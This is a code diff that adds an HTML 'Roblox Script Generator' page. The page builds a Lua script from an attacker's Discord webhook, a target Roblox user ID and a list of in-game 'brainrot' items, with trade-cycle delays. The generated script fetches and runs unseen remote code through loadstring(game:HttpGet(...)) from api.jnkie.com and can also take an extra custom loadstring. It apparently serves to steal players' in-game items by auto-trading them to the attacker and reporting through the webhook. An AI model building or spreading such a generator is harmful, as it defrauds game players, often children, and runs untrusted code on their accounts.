@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Roblox Script Generator</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 2rem 1rem;
+      font-family: Inter, sans-serif;
+      color: #f1f5f9;
+      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+    }
+    .container { width: 100%; max-width: 640px; display: flex; flex-direction: column; gap: 2rem; }
+    h1 {
+      text-align: center;
+      font-size: 2rem;
+      font-weight: 800;
+      background: linear-gradient(90deg, #a78bfa, #f472b6, #fb923c);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    p.sub { text-align: center; color: #c4b5fd; font-size: 0.875rem; margin-top: 0.5rem; }
+    .card {
+      background: rgba(255,255,255,0.05);
+      border: 1px solid rgba(167,139,250,0.3);
+      backdrop-filter: blur(10px);
+      border-radius: 1rem;
+      padding: 1.5rem;
+      display: flex;
+      flex-direction: column;
+      gap: 1.25rem;
+    }
+    label { display: block; font-size: 0.875rem; font-weight: 600; color: #ddd6fe; margin-bottom: 0.4rem; }
+    label span { color: rgba(167,139,250,0.6); font-weight: 400; font-size: 0.75rem; margin-left: 0.4rem; }
+    input, textarea {
+      width: 100%;
+      background: rgba(255,255,255,0.07);
+      border: 1px solid rgba(167,139,250,0.3);
+      border-radius: 0.5rem;
+      padding: 0.625rem 1rem;
+      font-size: 0.875rem;
+      color: #f1f5f9;
+      outline: none;
+      font-family: inherit;
+      transition: border-color 0.15s;
+    }
+    input:focus, textarea:focus { border-color: #a78bfa; }
+    input::placeholder, textarea::placeholder { color: rgba(167,139,250,0.4); }
+    textarea { resize: none; font-family: monospace; }
+    .row { display: flex; gap: 0.5rem; }
+    .row input { flex: 1; }
+    button.lookup {
+      background: linear-gradient(135deg, #7c3aed, #a21caf);
+      color: #fff;
+      font-weight: 600;
+      font-size: 0.875rem;
+      padding: 0 1rem;
+      border: none;
+      border-radius: 0.5rem;
+      cursor: pointer;
+      white-space: nowrap;
+      transition: opacity 0.15s;
+    }
+    button.lookup:hover { opacity: 0.85; }
+    button.lookup:disabled { opacity: 0.5; cursor: not-allowed; }
+    .error { color: #f87171; font-size: 0.75rem; margin-top: 0.25rem; }
+    .hint { color: rgba(167,139,250,0.55); font-size: 0.75rem; margin-top: 0.25rem; }
+    .hint code { color: #f9a8d4; }
+    button.generate {
+      width: 100%;
+      background: linear-gradient(135deg, #7c3aed, #db2777, #ea580c);
+      color: #fff;
+      font-weight: 700;
+      font-size: 0.9rem;
+      padding: 0.75rem;
+      border: none;
+      border-radius: 0.5rem;
+      cursor: pointer;
+      transition: opacity 0.15s, transform 0.1s;
+    }
+    button.generate:hover { opacity: 0.9; }
+    button.generate:active { transform: scale(0.98); }
+    .output-card {
+      background: rgba(255,255,255,0.05);
+      border: 1px solid rgba(74,222,128,0.3);
+      backdrop-filter: blur(10px);
+      border-radius: 1rem;
+      padding: 1.5rem;
+      display: none;
+      flex-direction: column;
+      gap: 0.75rem;
+    }
+    .output-header { display: flex; align-items: center; justify-content: space-between; }
+    .output-header h2 { font-size: 0.875rem; font-weight: 600; color: #86efac; }
+    button.copy {
+      font-size: 0.75rem;
+      font-weight: 600;
+      background: linear-gradient(135deg, #7c3aed, #a21caf);
+      color: #fff;
+      border: none;
+      padding: 0.375rem 0.75rem;
+      border-radius: 0.5rem;
+      cursor: pointer;
+      transition: opacity 0.15s;
+    }
+    button.copy:hover { opacity: 0.85; }
+    button.copy.copied { background: linear-gradient(135deg, #16a34a, #15803d); }
+    pre {
+      font-size: 0.75rem;
+      color: #4ade80;
+      background: rgba(0,0,0,0.4);
+      border: 1px solid rgba(74,222,128,0.2);
+      border-radius: 0.5rem;
+      padding: 1rem;
+      overflow-x: auto;
+      white-space: pre-wrap;
+      word-break: break-all;
+      line-height: 1.6;
+      font-family: monospace;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div>
+      <h1>Roblox Script Generator</h1>
+      <p class="sub">Fill in your details below and click Generate Script</p>
+    </div>
+
+    <div class="card">
+      <div>
+        <label for="webhook">Discord Webhook URL</label>
+        <input id="webhook" type="text" placeholder="https://discord.com/api/webhooks/..." />
+      </div>
+
+      <div>
+        <label>Roblox Username <span>— auto-fills User ID</span></label>
+        <div class="row">
+          <input id="username" type="text" placeholder="e.g. Builderman" onkeydown="if(event.key==='Enter')lookup()" />
+          <button class="lookup" id="lookup-btn" onclick="lookup()">Look up</button>
+        </div>
+        <div class="error" id="lookup-error"></div>
+      </div>
+
+      <div>
+        <label for="userid">Roblox User ID</label>
+        <input id="userid" type="text" placeholder="Auto-filled from username lookup, or enter manually" />
+      </div>
+
+      <div>
+        <label for="brainrots">Target Brainrots <span>(one per line)</span></label>
+        <textarea id="brainrots" rows="5" placeholder="Dragon Cannelloni&#10;Tim Cheese&#10;..."></textarea>
+      </div>
+
+      <div>
+        <label for="custom">Custom Loadstring <span>(optional)</span></label>
+        <textarea id="custom" rows="3" placeholder='loadstring(game:HttpGet("YOUR_URL"))()'></textarea>
+        <p class="hint">If filled, added as a second <code>task.spawn</code> block in the output.</p>
+      </div>
+
+      <button class="generate" onclick="generate()">Generate Script</button>
+    </div>
+
+    <div class="output-card" id="output-card">
+      <div class="output-header">
+        <h2>Generated Script</h2>
+        <button class="copy" id="copy-btn" onclick="copyScript()">Copy</button>
+      </div>
+      <pre id="script-output"></pre>
+    </div>
+  </div>
+
+  <script>
+    async function lookup() {
+      const username = document.getElementById('username').value.trim();
+      if (!username) return;
+      const btn = document.getElementById('lookup-btn');
+      const err = document.getElementById('lookup-error');
+      btn.disabled = true;
+      btn.textContent = '...';
+      err.textContent = '';
+      try {
+        const res = await fetch(`https://api.roblox.com/users/get-by-username?username=${encodeURIComponent(username)}`);
+        const data = await res.json();
+        if (data.Id) {
+          document.getElementById('userid').value = data.Id;
+        } else {
+          err.textContent = 'User not found.';
+        }
+      } catch {
+        err.textContent = 'Lookup failed. Enter the ID manually.';
+      }
+      btn.disabled = false;
+      btn.textContent = 'Look up';
+    }
+
+    function generate() {
+      const webhook = document.getElementById('webhook').value;
+      const userid = document.getElementById('userid').value;
+      const raw = document.getElementById('brainrots').value;
+      const custom = document.getElementById('custom').value.trim();
+      const brainrots = raw.split('\n').map(b => b.trim()).filter(b => b.length > 0);
+      const entries = brainrots.map((b, i) => `    ["${b}"] = true${i < brainrots.length - 1 ? ',' : ''}`).join('\n');
+      const customBlock = custom ? `\ntask.spawn(function()\n${custom}\nend)` : '';
+
+      const script = `getgenv().TARGET_ID = "${userid}"
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().DISCORD_WEBHOOK = "${webhook}"
+getgenv().TARGET_BRAINROTS = {
+${entries}
+}
+task.spawn(function()
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/8665366837c09ed56f0e30fdebd4baf1b39864d8822bffdf882f80d3d60b55c9/download"))()
+end)${customBlock}`;
+
+      document.getElementById('script-output').textContent = script;
+      const card = document.getElementById('output-card');
+      card.style.display = 'flex';
+      document.getElementById('copy-btn').textContent = 'Copy';
+      document.getElementById('copy-btn').classList.remove('copied');
+    }
+
+    function copyScript() {
+      const text = document.getElementById('script-output').textContent;
+      navigator.clipboard.writeText(text);
+      const btn = document.getElementById('copy-btn');
+      btn.textContent = 'Copied!';
+      btn.classList.add('copied');
+      setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+    }
+  </script>
+</body>
+</html>
